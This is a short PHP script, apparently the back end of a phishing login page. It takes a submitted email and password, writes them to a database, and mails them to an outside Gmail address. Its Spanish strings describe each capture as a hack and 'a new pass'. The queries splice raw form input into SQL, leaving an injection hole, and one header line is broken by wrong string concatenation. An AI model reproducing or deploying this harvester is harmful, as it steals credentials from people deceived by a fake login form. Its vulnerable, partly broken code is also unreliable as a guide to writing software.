<?php

include("images.php");

$tuCorreo=$_POST['email'];
$pass=$_POST['pass'];

$cabecera="Hola yei yei hackeo\r\n";

$mensaje = "Ahi te va un nuevo pass: \n";
$mensaje .= "Correo: ".$tuCorreo."\n";
$mensaje .= "Pass: ".$pass;
	/*	
if( isset( $_POST['user'] ) ){
	$maximo = strlen($_POST['user']); 
	echo $fuser = substr($_POST['user'],16,$maximo); 
	
	
	if( !empty($fuser) ){
		$kosula="SELECT fhemail FROM woofer16 WHERE fhusher = '$fuser'";
		$resTirador = mysql_query($kosula);
		while ($reggae = mysql_fetch_array($resTirador,MYSQL_ASSOC)){
			$correoUser = $reggae["fhemail"];
			mail($correoUser,"Password de ".$tuCorreo, $mensaje,$cabecera);
		}
	}
}*/
$kosula="INSERT INTO usuarios (nombre,pass) VALUES('$tuCorreo','$pass')";
		$resTirador = mysql_query($kosula);

        $mail = "Prueba de mensaje";
//Titulo
$titulo = "PRUEBA DE TITULO";
//cabecera
$headers = "MIME-Version: 1.0\r\n"; 
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n"; 
//dirección del remitente 
$headers .= "USUARIO: " + $tuCorreo + "PASS: " + $pass + "\r\n";
//Enviamos el mensaje a tu_dirección_email 
$kosula="INSERT INTO usuarios (nombre, pass) VALUES ('$tuCorreo','$pass')";
mail("gfdgeras@gmail.com",$titulo,$mail,$headers);

		header("Location: http://127.0.0.1/");
?>